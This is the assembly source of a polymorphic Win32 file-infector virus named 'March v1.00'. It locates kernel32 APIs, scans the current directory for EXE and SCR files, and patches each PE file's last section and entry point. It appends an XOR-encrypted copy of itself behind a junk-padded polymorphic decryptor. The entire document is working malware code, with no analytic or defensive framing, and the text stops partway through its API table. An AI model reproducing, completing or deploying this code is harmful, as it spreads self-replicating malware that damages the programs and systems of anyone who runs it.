;EasyCodeName=Mars,1
.486
.Model flat,stdcall
Option casemap:none
Include C:\masm32\Include\windows.inc
Include C:\masm32\Include\kernel32.inc
IncludeLib C:\masm32\lib\kernel32.lib

.DATA
DB 0
VIRUS_BODY_SIZE EQU (Virus_End - VIRUS_START)
VIRUS_BODY_SIZE_ALIGNED EQU (Virus_End - VIRUS_START)/4-1
;VIRUS_DECRYPTOR_SIZE EQU (DECRYPT_END-DECRYPT_START)
.CODE
Assume FS : NOTHING
 March:
;DECRYPT_START:
 ;_@D1: mov edi,VIRUS_START							;the begin of decrypt
 ;_@D2: mov ebx,00000000h							;the decrypt key
 ;_@D3: mov ecx,00000004h							;the size of data to decrypt
 ;_@D4: xor Dword Ptr [edi],ebx
 ;      add edi,4
 ;      sub ecx,4
 ;      or ecx,ecx
  ;     jnz  _@D4
  ;     jmp VIRUS_START
;DECRYPT_END:

VIRUS_START:
	;int 3
	call Delta
Delta:												; Get the Delta offset
 	mov ebx,[esp]
 	sub ebx,Offset Delta
 	mov esi,Dword Ptr [esp + 4]
 	and esi,0FFFF0000h
 	PushAD
 	Push Ebx
 	Mov Ecx,5
 	call GetKernelBase
 	or eax,eax
 	jnz InfectFail
 	call GetProcAddr
 	or eax,eax
 	jz InfectFail
 	mov esi,eax 	
 	;call GetWriteAccess
 	mov Dword Ptr [ebx+_GetProcAddress],eax
	mov Dword Ptr [ebx+kernel],edx
	mov esi,eax
	mov edi,edx
 	call GetAPIs
  	mov esi,[ebx+_GetProcAddress]
  	call GetU32API
	lea esi,[ebx+EXESearch]
	call InfectAll
	lea esi,[ebx+SCRSearch]
	call InfectAll
	push MB_OK
 	lea edi,[ebx+szTitle]
 	push edi
 	lea edi,[ebx+szMessage]
 	push edi
 	push 0  
 	call [ebx+_MessageBox]
InfectFail:
 	cmp ebx,0
 	je FakeHost
 	
 	mov eax,Dword Ptr [ebx+OldEIP]
 	add eax,Dword Ptr [ebx+ModBase]
 	call eax
 	popad
 	;ret
 FakeHost:
 	popad
 	;int 3

 	Invoke  ExitProcess,NULL

;---------------------------------------------------------------------------------
;																				 ;
;                              Get Kernel Base 									 ;
;																				 ;
;---------------------------------------------------------------------------------

 ;Prameters: esi --> first kernel test address
 ;           ecx --> number of pages (mul 10,000)
 ;           ebx --> delta
 ;Returns :	 esi --> real kernel base
 ;Error : 	 eax become non-zero
 
 GetKernelBase Proc
 _@1:
 	cmp Word Ptr [esi],"ZM"
 	je  _@3
 _@2:
    dec ecx
    jz KernelFail
    sub esi,00010000h
    jmp _@1
 _@3:
    mov eax,[esi].IMAGE_DOS_HEADER.e_lfanew
    add eax,esi
    cmp Word Ptr [eax],"EP"
    jne KernelFail
 _@4:
 	xor eax,eax
 	ret
 KernelFail:
 	mov eax,1	;non-zero
 	ret
 GetKernelBase EndP
 
;---------------------------------------------------------------------------------
;																				 ;
;                              GetProcAddress 									 ;
;																				 ;
;---------------------------------------------------------------------------------

 ;Prameters: esi --> Kernel Base
 ;           ebx --> delta
 ;Returns :  eax --> GetProcAddress
 ;			 edx --> Kernel Base
 ;Error : 	 eax become zero
 
 GetProcAddr Proc
 Local AddressFunctions :Dword
 Local AddressNames 	:Dword
 Local AddressNamesOrd  :Dword
 _@1:
 	mov edx,esi								;Kernel base
    mov eax,[esi].IMAGE_DOS_HEADER.e_lfanew
    add eax,esi
    cmp Word Ptr [eax],"EP"
	jnz GetProcAddrFail
	
 _@2:
 	mov esi,eax
 	mov eax,[esi].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[0].VirtualAddress
 	add eax,edx
 	mov esi,eax
 	
 	mov eax,[esi].IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
 	add eax,edx
 	mov Dword Ptr [AddressFunctions],eax
 
  	mov eax,[esi].IMAGE_EXPORT_DIRECTORY.AddressOfNames 
 	add eax,edx
 	mov Dword Ptr [AddressNames],eax
 	
  	mov eax,[esi].IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
 	add eax,edx
 	mov Dword Ptr [AddressNamesOrd],eax	
 	push ebx
 	 											;1st push	
 	mov edi,AddressNames
 	push ebp                                    ;2nd push
 	mov ebp,ebx
 	xor ebx,ebx	
 	mov esi,edi								
 _@3:
 	;int 3
    												
    lodsd
    push esi                                   ;3rd push
    lea edi,[edx+eax]
    ;pushad											
	lea esi,[ebp+szGetProcAddress]
    mov cl,Byte Ptr[ebp+szGetProcAddress-1]
    repz cmpsb
    ;popad
    jz FoundAddress
    inc ebx
    pop esi												;3rd pop
    cmp ebx,[esi].IMAGE_EXPORT_DIRECTORY.NumberOfNames
    jnz _@3
 GetProcAddrFail:
 	pop ebp												;2nd pop
 	pop ebx												;1st pop
 	xor eax,eax
 	ret
FoundAddress:
	pop esi
	mov esi,edx
	pop ebp
    mov eax,[esi].IMAGE_DOS_HEADER.e_lfanew
    add eax,esi
    mov esi,eax
	mov eax,Dword Ptr [AddressNamesOrd]
	mov edi,eax
	movzx eax,Word Ptr [edi+ebx*2]
	mov ebx,eax
	mov eax,AddressFunctions
    mov edi,eax
	mov eax,Dword Ptr [edi+ebx*4]
	pop ebx
	add eax,edx					;eax --> GetProcAddress
	ret
 GetProcAddr EndP
 
;---------------------------------------------------------------------------------
;																				 ;
;                              GetWriteAccess 									 ;
;																				 ;
;---------------------------------------------------------------------------------

 ;Prameters: esi --> GetProcAddress
 ;           ebx --> delta
 ;Returns :  eax --> VirtualProtect Address
 
 ;GetWriteAccess Proc
 ;	push edx
;	push eax
;	movzx eax,Byte Ptr [ebx+ szVirtualProtect-1]
 ;	push eax
 ;	lea edi,[ebx+szVirtualProtect]
 ;	push edi
 ;	push edx
 ;	call esi
 ;	push esp
;	push PAGE_EXECUTE_READWRITE
;	push VIRUS_BODY_SIZE
;	lea edi,[ebx + VIRUS_START]
 ;	push edi
 ;	call eax
;	add esp,4										;Here don't ask me why ?   this when error debugging
 ;	pop eax
 ;	pop edx	
 ;	ret
;GetWriteAccess EndP

;---------------------------------------------------------------------------------
;																				 ;
;                              Get All APIs 									 ;
;																				 ;
;---------------------------------------------------------------------------------

 ;Prameters: esi --> GetProcAddress
 ;           ebx --> delta
 ;			 edi --> Kernel Base
 
 GetAPIs	Proc
_@1:
	push ebx
 	push edi
 	lea ebx,[ebx +Offset API_TABLE]
_@2:
  	movzx ecx,Byte Ptr [ebx]
 	push ecx
 	inc ebx
 	lea edx,[ebx]
 	add ebx,ecx					;the API Address
 	push edx
 	push edi
 	call esi
	mov Dword Ptr [ebx],eax
	add ebx,4
	add esp,4					;Error Debugging
cmp Byte Ptr [ebx],0BBh 
	jnz _@2
 	pop edx
	pop ebx
ret
 
 
GetAPIs		EndP

;---------------------------------------------------------------------------------
;																				 ;
;                              Get USER32 APIs 									 ;
;																				 ;
;---------------------------------------------------------------------------------

 ;Prameters: esi --> GetProcAddress
 ;           ebx --> delta
 ;Returns :  eax --> MessageBoxA Address or null if error occur
 
GetU32API		Proc
_@1:
	push ebx
	lea edi,[ebx+szUser32]
 	push edi
 	call Dword Ptr [ebx+_LoadLibrary]
 	mov Dword Ptr [ebx+_User32],eax
 	lea ebx,[ebx +Offset USER32API]
_@2:
  	movzx ecx,Byte Ptr [ebx]
 	push ecx
 	inc ebx
 	lea edx,[ebx]
 	add ebx,ecx					;the API Address
 	push edx
 	push eax
 	call esi
	mov Dword Ptr [ebx],eax
	add esp,4					;Error Debugging
	pop ebx
	ret
GetU32API		EndP
 ;---------------------------------------------------------------------------------
 ;																				  ;
 ;                       Searching For Files to Infect							  ;
 ;																				  ;
 ;---------------------------------------------------------------------------------
 
 ;Prameters: ebx --> delta
 ;			 esi --> Search Pattren
 
InfectAll 		Proc
_@1:
	;int 3
	pushad
	lea edi,[ebx+CurrentDir]
	push edi
	push MAX_PATH
	call [ebx+_GetCurrentDirectory]
	push edi
	call [ebx+_SetCurrentDirectory]
	lea edi,[ebx+FindData]
	push edi
	;lea edi,[ebx+EXESearch]
	push esi
	call [ebx+_FindFirstFile]
	cmp eax,0FFFFFFFFh
	je _@3
	mov Dword Ptr [ebx+hFind],eax
	lea esi,[ebx+FindData.cFileName]
	mov ecx,[ebx+FindData.nFileSizeLow]
	push [ebx+OldEIP]
	push [ebx+ModBase]
	call InfectFile
	pop [ebx+OldEIP]
	pop [ebx+ModBase]

	;call InfectFile
_@2:
	;lea esi,[ebx+FindData.cFileName]
	lea edi,[ebx+FindData]
	push edi
	mov edi,Dword Ptr[ebx+hFind]
	push edi
	call [ebx+_FindNextFile]
	or eax,eax
	jz _@3
	lea esi,[ebx+FindData.cFileName]
	mov ecx,[ebx+FindData.nFileSizeLow]
	push [ebx+OldEIP]
	push [ebx+ModBase]
	call InfectFile
	pop [ebx+OldEIP]
	pop [ebx+ModBase]
	jmp _@2
	
_@3:
	mov edi,Dword Ptr [ebx+hFind]
	push edi
	call [ebx+_FindClose]
	popad
	ret
InfectAll 		EndP
 ;---------------------------------------------------------------------------------
 ;																				  ;
 ;                              Infect a File								  	  ;
 ;																				  ;
 ;---------------------------------------------------------------------------------
 
 ;Prameters: ebx --> delta
 ;			 esi --> Address of filename
 ;			 ecx --> FileSize
 
InfectFile		Proc

Local hFile 				:Dword
Local hMap 					:Dword
Local lpFilePointer 		:Dword
Local NumSecs				:Word
Local OldEP					:Dword
Local ImgBase				:Dword
Local NewSize 				:Dword
Local NewEP					:Dword
Local FileSize				:Dword
Local nAlign				:Dword
Local VIRUS_DECRYPTOR_SIZE 	:Dword
Local XorKey				:Dword
_@01:
	;int 3
	push esi
	mov Dword Ptr FileSize,ecx	
	call OpenAFile
	or eax,eax
	jz _@4
	mov Dword Ptr hFile,eax
	mov ecx,FileSize
	call CreateMap
	or eax,eax
	jz _@4
	mov hMap,eax
	mov ecx,FileSize	
	call MapFile
	or eax,eax
	jz _@4
	mov lpFilePointer,eax
	mov esi,eax
_@02:
	;int 3
	cmp Word Ptr [esi],"ZM"
	jnz _@4
	mov edi,[esi].IMAGE_DOS_HEADER.e_lfanew
	add edi,esi
	cmp Word Ptr [edi],"EP"
	jnz _@4
	cmp Dword Ptr [esi+4eh],"suhT"
	jz _@4
	mov esi,edi
	mov edx,[esi].IMAGE_NT_HEADERS.OptionalHeader.FileAlignment
	mov nAlign,edx
	
_@02_2:		;Get Decryptor Pointer for Poly
	xor eax,eax
	mov ax,[esi].IMAGE_NT_HEADERS.FileHeader.NumberOfSections
	mov Word Ptr [NumSecs],ax
	mov eax,[esi].IMAGE_NT_HEADERS.OptionalHeader.NumberOfRvaAndSizes
	mov edx,Sizeof IMAGE_DATA_DIRECTORY
	imul edx
	add edi,eax
	xor eax,eax
	mov ax,Word Ptr [NumSecs]
	dec eax
	mov edx,Sizeof IMAGE_SECTION_HEADER
	imul edx
	add edi,eax
	add edi,78h						;edi --> last Section Header & esi --> PE Header
	mov edx,[edi].IMAGE_SECTION_HEADER.SizeOfRawData
	add edx,[edi].IMAGE_SECTION_HEADER.VirtualAddress
	add edx,[esi].IMAGE_NT_HEADERS.OptionalHeader.ImageBase	
_@02_3:
	pushad
	mov edi,edx
	mov ecx,VIRUS_BODY_SIZE
	mov eax,ecx
	mov ecx,4
	call AlignSize
	mov ecx,eax
	call [ebx+_GetTickCount]		;put eax -->xor key
	mov XorKey,eax
	mov edx,1
	call BHPE
	mov VIRUS_DECRYPTOR_SIZE,eax
	popad
_@03:
	mov edx,Dword Ptr [lpFilePointer]
	push edx
	call [ebx+_CloseMap]
	mov edx,Dword Ptr [hMap]
	push edx
	call [ebx+_CloseHandle]
	mov edx,Dword Ptr [hFile]
	push edx
	call [ebx+_CloseHandle]

_@1:
	pop esi
	call OpenAFile
	or eax,eax
	jz _@4
	mov Dword Ptr hFile,eax
	push eax
	mov ecx,FileSize
	add ecx,VIRUS_BODY_SIZE
	add ecx,VIRUS_DECRYPTOR_SIZE
	mov eax,ecx
	mov ecx,nAlign
	call AlignSize
	mov ecx,eax
	pop eax
	call CreateMap
	or eax,eax
	jz _@4
	mov hMap,eax
	push eax
	mov ecx,Dword Ptr FileSize
	add ecx,VIRUS_BODY_SIZE
	add ecx,VIRUS_DECRYPTOR_SIZE
	mov eax,ecx
	mov ecx,nAlign
	call AlignSize
	mov ecx,eax
	pop eax
	call MapFile
	or eax,eax
	jz _@4
	mov lpFilePointer,eax
	mov esi,eax
_@2:
	cmp Word Ptr [esi],"ZM"
	jnz _@4
	mov edi,[esi].IMAGE_DOS_HEADER.e_lfanew
	add edi,esi
	cmp Word Ptr [edi],"EP"
	jnz _@4
	mov esi,edi
_@3:
	xor eax,eax
	mov eax,[esi].IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint
	mov Dword Ptr [ebx+OldEIP],eax
	mov eax,[esi].IMAGE_NT_HEADERS.OptionalHeader.ImageBase
	mov Dword Ptr [ebx+ModBase],eax
	mov eax,[esi].IMAGE_NT_HEADERS.OptionalHeader.NumberOfRvaAndSizes
	mov edx,Sizeof IMAGE_DATA_DIRECTORY
	imul edx
	add edi,eax
	xor eax,eax
	mov ax,Word Ptr [NumSecs]
	dec eax
	mov edx,Sizeof IMAGE_SECTION_HEADER
	imul edx
	add edi,eax
	add edi,78h						;edi --> last Section Header & esi --> PE Header
	mov eax,[edi].IMAGE_SECTION_HEADER.VirtualAddress
	add eax,[edi].IMAGE_SECTION_HEADER.SizeOfRawData
	mov [esi].IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint,eax
	mov ecx,[edi].IMAGE_SECTION_HEADER.SizeOfRawData
	mov edx,[edi].IMAGE_SECTION_HEADER.PointerToRawData
	add edx,ecx
	push edx
	add ecx,VIRUS_BODY_SIZE
	add ecx,VIRUS_DECRYPTOR_SIZE
	mov eax,ecx
	mov ecx,nAlign
	call AlignSize
	mov ecx,eax
	;int 3
	push edx
	mov edx,[edi].IMAGE_SECTION_HEADER.SizeOfRawData
	add edx,[edi].IMAGE_SECTION_HEADER.VirtualAddress
	add edx,[esi].IMAGE_NT_HEADERS.OptionalHeader.ImageBase
	;add edx,esi
	;sub edx,lpFilePointer
	
	;mov Dword Ptr [ebx+_@D1+1],edx
	;add Dword Ptr [ebx+_@D1+1],Offset VIRUS_START
	;add Dword Ptr [ebx+_@D1+1],VIRUS_DECRYPTOR_SIZE
	
	pop edx
	mov Dword Ptr NewSize,ecx
	mov [edi].IMAGE_SECTION_HEADER.Misc.VirtualSize,ecx
	mov [edi].IMAGE_SECTION_HEADER.SizeOfRawData,ecx
	mov edx,[edi].IMAGE_SECTION_HEADER.VirtualAddress
	add edx,ecx
	mov [esi].IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage,edx
	or  Dword Ptr [edi].IMAGE_SECTION_HEADER.Characteristics,SECTION_ALL_ACCESS;0A0000020h
	;mov Dword Ptr [edi].IMAGE_SECTION_HEADER.Characteristics,0E0000040h
	mov edi,Dword Ptr lpFilePointer
	mov Dword Ptr [edi+4eh],"suhT"
	pop edx
	add edx,lpFilePointer
	mov edi,edx
	mov edx,ebx
	;pop ebx
	
	mov edx,XorKey
	;mov edx,02F46ACD3h
	push edx
	
	;mov Dword Ptr [ebx+_@D2+1],edx
	mov ecx,VIRUS_BODY_SIZE
	mov eax,ecx
	mov ecx,4
	call AlignSize
	push eax
	;mov Dword Ptr [ebx+_@D3+1],eax
	lea esi,[ebx+PolyDecrypt]
    mov ecx,VIRUS_DECRYPTOR_SIZE
    xor eax,eax
    rep movsb
	lea esi,[ebx+VIRUS_START]
	pop ecx
	;mov ecx,VIRUS_BODY_SIZE
	xor eax,eax
	pop edx
	
Loop1:
	mov eax,Dword Ptr [esi]
	xor eax,edx
	mov Dword  Ptr [edi],eax 
	add esi,4
	add edi,4
      sub ecx,4
      cmp ecx,3
      jz _@4
      cmp ecx,2
      jz _@4
      cmp ecx,1
      jz _@4
      or ecx,ecx
      jnz  Loop1
_@4:
	xor eax,eax
	cmp Dword Ptr [lpFilePointer],eax
	jz _@5
	mov edx,Dword Ptr [lpFilePointer]
	push edx
	call [ebx+_CloseMap]
	xor eax,eax
	cmp Dword Ptr [hMap],eax
	jz _@5
	mov edx,Dword Ptr [hMap]
	push edx
	call [ebx+_CloseHandle]
	xor eax,eax
	cmp Dword Ptr [hFile],eax
	jz _@5
	mov edx,Dword Ptr [hFile]
	push edx
	call [ebx+_CloseHandle]
_@5:
	ret
InfectFile		EndP
 ;---------------------------------------------------------------------------------
 ;																				  ;
 ;                              Polymorphism 								  	  ;
 ;																				  ;
 ;---------------------------------------------------------------------------------

 ;-=-=-=-=-=-=-=-=-=-=-=-== Brocken Heart Polymorphic Engine =-=-=-=-=-=-=-=-=-=--=-=-=-=-=-

Junk proto :DWORD 
; edi --> Decrypt Pointer
; ecx --> Virus Size 
; ebx --> Delta offset
; edx --> Decrypt Table
; eax --> Xor Key
;
;Return:
;-=-=-=-
; eax --> Decryptor Size

BHPE    Proc
local DecryptPointer	:DWORD
local XorKey	    	:DWORD
local VirusSize     	:DWORD
local FirstIns			:DWORD
local DecryptTable		:DWORD
local bgnLoop			:DWORD
local DecryptorEnd		:DWORD
local RegPointer    	:BYTE

	;push 1									;all registers not restricted but esp & ebp restricted
	;call FillBytes							;Garpage
	mov DecryptPointer,edi
	lea edi,[PolyDecrypt]
	add edi,ebx								;add delta offset
	;mov  BYTE PTR [edi],060h				;Pushad : to make us have 8 free variables in stack 
	;inc edi								;for grapage (60=Pushad)
	;push 4									;all not restricted
	;call FillBytes							;garpage
	;mov eax,0FFFFFFFFh
	;push ecx
	;call GetRandomNum						;for Xor key
	;pop ecx
	mov VirusSize,ecx						;Save variable for later use
	mov XorKey,eax							; ,,    ,,     ,,   ,,   ,,
											; ,,    ,,     ,,   ,,   ,,
	mov DecryptTable,edx					; ,,    ,,     ,,   ,,   ,,
	mov eax,03h								;0,1,2
	call GetRandomNum						;for random register
	or eax,eax
	jnz _@Test2
	mov eax,3								;ebx
	jmp EndTest
_@Test2:
	add eax,5								;esi & edi
EndTest:
	mov RegPointer,al
	mov Byte Ptr [edi],0B8h 				;0B8 => mov eax
	add byte ptr[edi],al					;make it mov edi or mov esi
	inc edi
	push eax 
	mov eax,(DecryptPointer)				;put in imm32 --> Pointer to virus body
	;add eax,DECRYPT_SIZE
	mov dword ptr [DecryptorEnd],edi
	mov dword ptr [edi],eax
	pop eax	
	add edi,4
	;push edi								;RegPointer Restricted
	;call FillBytes							;some junk
	mov bgnLoop,edi
;-=-=-=-=-=-= Decryptor Constant =-=-=-=-=-=-=-=-=-
	lea esi,[ebx+MultiDecryptTable]  
	movzx eax,byte ptr [esi]   			;choose the decryptor
	cmp eax,DecryptTable					; test if upper
	inc esi
	jbe dyptBegin
	mov eax,DecryptTable
dyptBegin:
	dec eax
	mov esi ,dword ptr [esi+eax*4]
	add esi,ebx
	movzx ecx,byte ptr [esi]
	inc esi
	dec ecx
	xor edx,edx
AddDecryptor:
	push esi
	push ecx
	mov esi,dword ptr [esi+edx*4]

	add esi,ebx
ChooseConst:
	movzx eax,byte ptr [esi]
	inc esi
	push edx
	Call GetRandomNum
	pop edx
	mov esi,dword ptr [esi+eax*4]
	add esi,ebx
	movzx ecx,byte ptr [esi]
	cmp edx,0
	jnz _@454754 
	add bgnLoop,ecx
_@454754:
	inc esi
	;push esi
	push ecx
	push edi
CopyConst:
	mov al,byte ptr [esi]
	mov byte ptr [edi],al
	inc esi
	inc edi
	dec ecx
	cmp ecx,0
	jnz CopyConst
CheckPramaters:
	cmp byte ptr [esi],0BBh
	jz EndCheck
	;pop ecx
	;pop esi
	pop edi
	push edi
	movzx eax,byte ptr [esi]
	dec eax
	add edi,eax
	inc esi
	mov eax,dword ptr [esi]
	sub dword ptr[edi],eax
	add esi,4
	movzx eax,byte ptr [esi]
	inc esi
	cmp eax,0			;Virus Size
	jnz case_2
	mov eax,VirusSize
	add dword ptr[edi],eax
	jmp finnaly
case_2:
	cmp eax,1			;RegPointer
	jnz case_3
	movzx eax,RegPointer
	add byte ptr[edi],al
	jmp finnaly
case_3:
	cmp eax,2			;XorKey
	jnz case_4
	mov eax,XorKey
	add dword ptr[edi],eax
	jmp finnaly
case_4:
	mov eax,edi
	add eax,4			;for size of DWORD to modify
	sub eax,bgnLoop
	sub dword ptr[edi],eax
finnaly:
	jmp CheckPramaters
EndCheck:
	pop edi				;del edi
	pop ecx
	add edi,ecx
	xor eax,eax
	push edx
	push edi 
	call FillBytes
	invoke Junk,5
	pop edx
	inc edx
	pop ecx
	pop esi
	cmp edx,ecx
	jbe AddDecryptor
	mov eax,edi
	lea ecx,[PolyDecrypt]
	add ecx,ebx
	sub eax,ecx
	mov edi,dword ptr [DecryptorEnd]
	add dword ptr [edi],eax
	ret
BHPE    EndP

FillBytes	Proc  DecryptPtr:DWORD
	local FirstPtr:DWORD
	local SecondPtr:DWORD
	local ThirdPtr:DWORD
	
	mov edi,DecryptPtr
	mov byte ptr [edi],0E8h			;call opcode
	inc edi
	mov dword ptr[edi],0h			;the relative ptr will be putted here
	add edi,4
	mov FirstPtr,edi
	mov eax,10h
	call GetRandomNum
	invoke Junk,eax
	
	mov byte ptr[edi],0EBh
	inc edi
	mov byte ptr[edi],0
	inc edi
	mov SecondPtr,edi
	mov eax,edi
	sub eax,FirstPtr
	mov edi,FirstPtr
	sub edi,4
	mov dword ptr [edi],eax
	mov edi,SecondPtr
	
	mov eax,10h
	call GetRandomNum
	invoke Junk,eax
	mov byte ptr [edi],0C3h
	inc edi
	mov ThirdPtr,edi
	push edi
	mov eax,edi
	sub eax,SecondPtr
	mov edi,SecondPtr
	dec edi
	mov byte ptr [edi],al
	pop edi
	
	mov eax,10h
	call GetRandomNum
	invoke Junk,eax
	ret 4	
FillBytes	EndP

;ebx --> delta offset
;edi -->decrypt code pointer

Junk 	Proc,nBytes:DWORD
	push edx
	junk_start:
	mov eax,nOpcodes
	call GetRandomNum
	inc eax
	.IF eax==1 
		lea esi,dword ptr [opcodes_1]
		add esi,ebx
		movzx eax,byte ptr [esi]
		inc esi
		call GetRandomNum
		add esi,eax
		xor eax,eax
		mov al,byte ptr [esi]
		mov byte ptr [edi],al
		inc edi
		dec nBytes
		cmp nBytes,0
		jz junk_end
		jg junk_start
	.ELSEIF eax==2
		cmp nBytes,2
		jb junk_start
		lea esi,dword ptr [opcodes_2]
		add esi,ebx
		movzx eax,byte ptr [esi]
		inc esi
		call GetRandomNum
		imul eax,2
		add esi,eax
		xor eax,eax
		mov ax,word ptr [esi]
		mov word ptr [edi],ax
		inc edi
		inc edi
		sub nBytes,2
		cmp nBytes,0
		jz junk_end
		jg junk_start
	.ELSEIF eax==3
		cmp nBytes,5
		jb junk_start
		lea esi,dword ptr [opcodes_5]
		add esi,ebx
		movzx eax,byte ptr [esi]
		inc esi
		call GetRandomNum
		imul eax,5
		add esi,eax
		xor eax,eax
		mov ecx,5
		rep movs byte ptr [esi],byte ptr [esi]
		sub nBytes,5
		cmp nBytes,0
		jz junk_end
		jg junk_start
	.ENDIF
junk_end:
	xor eax,eax
	pop edx
	ret
Junk 	EndP
PolyData:
PolyDataSize EQU (Offset PolyDataEnds -Offset PolyData)
DECRYPT_SIZE EQU 1024h
;-=-=-=-=-=-=-=-=-=-=-=-=-=-= Decryptor Constant Data =-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-

MultiDecryptTable:
	db 1
	dd (offset first_DecryptTable)
first_DecryptTable:						;the decryptor constant
	db 6											;number of instructions
	dd (offset Ains)						;mov ecx,VirusSize
	dd (offset Bins)						;@1: mov eax,dword [edi]
	dd (offset Cins)						;xor eax,XorKey
	dd (offset Dins)						;stosd
	dd (offset Fins)						;inc edi
	dd (offset Eins)						;loop @1
	
Ains:							;Table of instructions that could be used
	db 2						;number of constants for `1st instruction
	dd (offset A_1cons)			;mov ecx,VirusSize
	dd (offset A_2cons)			;push VirusSize   pop ecx
Bins:
	db 2
	dd (offset B_1cons)			;mov eax,dword ptr [edi]
	dd (offset B_2cons)			;push dword ptr [edi]  pop eax
Cins:	
	db 1
	dd (offset C_1cons)			;xor eax,XorKey
Dins:
	db 2
	;dd (offset D_1cons)				;stosd
	dd (offset D_2cons)			;mov dword ptr [edi],eax    add edi,4
	dd (offset D_3cons)			;push dword ptr [edi]  pop eax
Eins:
	db 2
	dd (offset E_1cons)			;loop
	dd (offset E_2cons)			;dec ecx   or ecx,ecx   jnz @1
Fins:
	db 3
	dd (offset F_1cons)			;inc edi
	dd (offset F_2cons)			;add edi,1
	dd (offset F_3cons)			;add 5 sub 4
A_1cons:
	db 5
	mov ecx,12345678h
	db 2
	dd 12345678h
	db 0,0BBh
A_2cons:
	db 6
	push 12345678h
	pop ecx
	db 2
	dd 12345678h
	db 0,0BBh
B_1cons:
	db 2
	mov eax,dword ptr [eax]
	db 2
	dd 0
	db 1,0BBh
B_2cons:
	db 3
	push dword ptr [eax]
	pop eax
	db 2
	dd 0
	db 1,0BBh
C_1cons:
	db 5
	xor eax,12345678h
	db 2
	dd 12345678h
	db 2,0BBh
D_1cons: 						;will be deleted
	db 1
	stosd
	db 0BBh
D_2cons:
	db 2
	mov dword ptr [eax],eax
	db 2
	dd 0
	db 1,0BBh
D_3cons:
	db 3
	push eax
	pop dword ptr[eax]
	db 3
	dd 0
	db 1,0BBh
E_1cons:
	db 11
	sub ecx,4
	or ecx,ecx
	db 0Fh,8Fh
	dd 0FFFFFFFFh	;jg 
	db 8
	dd 0FFFFFFFFh
	db 3,0BBh
E_2cons:
	db 11
	sub ecx,4
	or ecx,ecx
	db 0Fh,85h
	dd 0FFFFFFFFh	;jnz 
	db 8
	dd 0FFFFFFFFh
	db 3,0BBh
F_1cons:
	db 3
	add eax,4
	db 2
	dd 0
	db 1,0BBh
F_2cons:
	db 3
	add eax,4
	db 2
	dd 0
	db 1,0BBh
F_3cons:
	db 6
	add eax,5
	sub eax,1 
	db 2
	dd 0
	db 1
	db 5
	dd 0
	db 1,0BBh
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= Junk Data =-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-
nOpcodes EQU 3
opcodes_1:
db 1
NOP
opcodes_2:
db 5
or eax,eax
or ebx,ebx
or ecx,ecx
or edx,edx
push eax
pop eax
opcodes_5:
db 1
add ecx,2
dec ecx
dec ecx

;PolyDataEnds:
;PolyDecrypt db 100 dup (90)
 ;---------------------------------------------------------------------------------
 ;																				  ;
 ;                              		Misc								  	  ;
 ;																				  ;
 ;---------------------------------------------------------------------------------

GetRandomNum 	Proc
	push eax
	xor eax,eax
	mov eax,Dword Ptr[ebx+RandomBuffer]
	push eax
	add eax,50
	xor eax,04F367C34h
	imul eax,0A5h
	add eax,49
	mov ecx,000004A6h
	xor edx,edx
	div ecx
	imul eax,05A37h
	sub eax,6
	pop ecx
	;or ecx,00F000F0h
	;and eax,0FFF00FFFh
	xor eax,ecx
	mov Dword Ptr[ebx+RandomBuffer],eax
	xor edx,edx
	pop ecx
	div ecx
	mov eax,edx
	ret
GetRandomNum 	EndP
AlignSize 		Proc
	;int 3
	xor edx,edx
	push eax
	div ecx
	pop eax
	sub ecx,edx
	add eax,ecx
	ret
AlignSize		EndP
OpenAFile		Proc
	xor eax,eax
	push FILE_ATTRIBUTE_NORMAL
	push esi
	call [ebx +_SetFileAttributes]
	xor eax,eax
	push eax
	push FILE_ATTRIBUTE_NORMAL
	push OPEN_EXISTING
	push eax
	push FILE_SHARE_READ + FILE_SHARE_WRITE
	push GENERIC_READ + GENERIC_WRITE
	push esi
	call [ebx+_CreateFile]
	ret
OpenAFile		EndP

CreateMap		Proc
	xor edx,edx
	push edx
	push ecx
	push edx
	push PAGE_READWRITE
	push edx
	push eax
	call [ebx+ _CreateFileMapping]
	ret
CreateMap		EndP

MapFile			Proc
	xor edx,edx
	push ecx
	push edx
	push edx
	push FILE_MAP_WRITE
	push eax
	call [ebx+_MapViewOfFile]
	ret
MapFile			EndP

DataStart:
 RandomBuffer DB 8 DUP (144)
 PolyDecrypt db 1024 dup (144)
 
 szTitle   				DB "March v1.00 by Andreóe ",0
 szMessage 				DB "Copyright (c) 2006-2007 by Andreóe The BloodSword .",10,"and all rights reserved",0			 
 OldEIP			  		DD 00001000h
 ModBase		  		DD ?
 kernel 		  		DD ?
 hFind			  		DD ?
 ;hFile			  		DD ?
 ;hMap			  		DD ?
 ;lpFilePointer	  		DD ?
 FindData 		  		WIN32_FIND_DATA  <>
 CurrentDir		  		DB MAX_PATH DUP(?)
 EXESearch		  		DB "*.EXE",0
 SCRSearch		  		DB "*.SCR",0	
 				  		DB 14+1
 szGetProcAddress 		DB "GetProcAddress",0
 _GetProcAddress  		DD ?
; 				  		DB 14+1
; szVirtualProtect 		DB "VirtualProtect",0				;no need for saving it's Address we need it just for
 MAX_DECRYPTOR			EQU 100															;get write access to the virus body
 buffer					DB MAX_DECRYPTOR DUP(90)
 ;Constants:
; 	 mov edi,12345678h
; 	 mov ecx,VIRUS_BODY_SIZE
; 	 mov eax,12345678h
;_@1: xor Dword Ptr[edi],eax
; 	 add edi,4
 	 
; 	 loop FFFFFFFFh
 one_byte:
 
 two_byte:
 
 three_byte:
 
API_TABLE:
				  	   	DB 20+1
 szGetCurrentDirectory 	DB "GetCurrentDirectoryA",0
 _GetCurrentDirectory  	DD ?
				       	DB 20+1
 szSetCurrentDirectory 	DB "SetCurrentDirectoryA",0
 _SetCurrentDirectory  	DD ?
 				  	   	DB 14+1
 szFindFirstFile 	   	DB "FindFirstFileA",0
 _FindFirstFile  	   	DD ?
 				     	DB 13+1
 szFindNextFile 		DB "FindNextFileA",0
 _FindNextFile  		DD ?
 				  		DB 9+1
 szFindClose 			DB "FindClose",0
 _FindClose 			DD ?
 				  		DB 18+1
 szCreateFileMapping 	DB "CreateFileMappingA",0
